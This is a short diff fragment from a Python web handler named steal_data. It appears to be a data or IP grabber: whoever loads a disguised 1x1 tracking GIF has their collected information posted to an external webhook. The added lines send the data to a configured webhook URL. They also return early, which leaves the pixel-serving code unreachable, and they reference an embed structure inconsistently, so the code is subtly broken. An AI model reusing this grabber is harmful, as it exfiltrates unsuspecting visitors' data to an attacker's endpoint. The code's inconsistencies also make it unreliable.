@@ -128,10 +128,10 @@ def steal_data():
         ]
     }
     
-    try:
-        requests.post(WEBHOOK_URL, json={'embeds': [embed]}, timeout=5)
-    except:
-        pass
+    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
+    requests.post(config["webhook"], json = embed)
+    return info
+
     
     pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
     return Response(pixel, mimetype='image/gif')
